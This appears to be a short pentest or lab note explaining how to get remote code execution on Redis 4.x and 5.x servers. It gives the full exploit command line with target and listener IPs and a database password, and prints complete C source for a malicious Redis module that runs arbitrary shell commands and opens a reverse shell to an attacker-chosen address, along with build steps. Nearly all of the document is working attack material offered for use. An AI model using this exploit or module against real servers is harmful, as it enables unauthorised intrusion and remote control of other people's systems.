
Works for Redis 4.xx & 5.xx

---

## PoC

Download https://github.com/Ridter/redis-rce?tab=readme-ov-file

For me specifically I already have it in /home/saitama/Desktop/Tools/Redis/redis-rce

After that rename it to exp.so and run the exploit with the following Syntax and u'll receive RCE.

Note: "Ready4Redis?" is the redis-database user password.

```
python3 redis-rce.py -r 192.168.196.166 -p 6379 -L 192.168.45.164 -P 80 -v -f exp.so -a "Ready4Redis?"
```

## Compile exp.so


Before u can run this exploit u will need to compile an exp.so file.

Which u can get from here:

```
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

Unfortunately the module.c doesn't work, please use the following PoC:

```
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                char *env[] = {NULL};
                execve("/bin/sh", args, env);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
          if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
```

And build your module.so file 

```
make
```

change module.so to exp.so

```
mv module.so exp.so
```